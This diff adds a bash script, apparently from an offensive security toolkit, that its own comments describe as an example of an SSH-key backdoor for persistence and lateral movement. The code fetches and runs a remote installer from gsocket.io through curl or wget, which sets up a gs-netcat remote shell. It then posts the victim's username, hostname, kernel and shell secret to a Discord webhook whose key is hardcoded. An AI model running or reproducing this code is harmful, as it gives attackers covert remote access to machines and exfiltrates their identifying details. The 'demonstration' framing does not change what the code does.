@@ -1,0 +1,35 @@
+#! /bin/bash
+
+# YOU ARE WRONG HERE. YOU DO NOT NEED THIS SCRIPT.
+# EDIT ssh-key-backdoor.sh INSTEAD.
+#
+# This is an example script to demonstrate how ssh keys can be used to
+# as a permanent backdoor and to move laterally through a network.
+#
+# If you find this on your network then somebody tested our tool and
+# forgot to change the script's URL. Contact us at root@proton.thc.org.
+
+# Discord API key
+# This key can be changed HERE or you can set  your own key with
+# KEY=<YOUR DISCORD WEBHOOK KEY> ./gen
+[[ -z $KEY ]] && KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
+
+# Install GS-NETCAT and report installation back to DISCORD.
+command -v curl >/dev/null && IS_CURL=1 || command -v wget >/dev/null && IS_WGET=1 || exit 0
+if [[ -n $IS_CURL ]]; then
+    S="$(bash -c "$(curl -fsSL gsocket.io/x)")"
+else
+    S="$(bash -c "$(wget --no-verbose -O- gsocket.io/x)")"
+fi
+S=${S##*S=\"}
+S=${S%%\"*}
+X=($(hostname; uname -mrs))
+MSG="${USER} ${X[*]} -- gs-netcat -i -s${S:-BAD}"
+
+DATA='{"username": "sshx", "content": "'"$MSG"'"}'
+if [[ -n $IS_CURL ]]; then
+    curl -H "Content-Type: application/json" -d "${DATA}" "https://discord.com/api/webhooks/${KEY}"
+else
+    wget -q -O- --header="Content-Type: application/json" --post-data="${DATA}" "https://discord.com/api/webhooks/${KEY}"
+fi
+exit 0
